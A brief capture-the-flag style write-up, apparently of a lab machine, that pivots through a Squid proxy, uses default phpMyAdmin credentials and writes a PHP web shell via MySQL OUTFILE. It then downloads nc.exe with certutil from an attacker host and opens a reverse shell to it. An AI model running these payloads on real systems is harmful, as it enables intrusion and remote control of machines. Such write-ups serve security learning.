
- found a web-page running squid 4.14 on port 3128
- We learn that we can use a Squid Pivoting Open Port Scanner (spose.py) to detect open ports behind the Squid proxy ``python spose.py --proxy http://TARGET:3128 --target TARGET``
- found port 8080 
- I set up a proxy using FoxyProxy to TARGET:3128 so that I can access port 8080
  (FoxyProxy is a firefox extension)
- used dirb to enumerate directories `dirb http://TARGET:8080 /usr/share/wordlists/dirb/big.txt -p TARGET:3128`
- found phpmyadmin 
- found the document root 
- found a login page using default credentials 
- used the console for a MYSQL command execution 
```
SELECT "<?php echo shell_exec($_GET['c']);?>" into OUTFILE 'C:/wamp/www/webshell.php'
```
This wrote a web-shell to that directory
- I was able to access this endpoint to execute commands `TARGET:8080/shell.php?c=id`
- Downloaded nc to the target, from my attacking machine 
```
certutil -urlcache -f http://ATTACKER:8000/nc.exe nc.exe
```
- set up my listener 
- then pasted my payload into the url 
```
nc.exe ATTACKER 4444 -e cmd.exe
```

Got Admin shell acess!




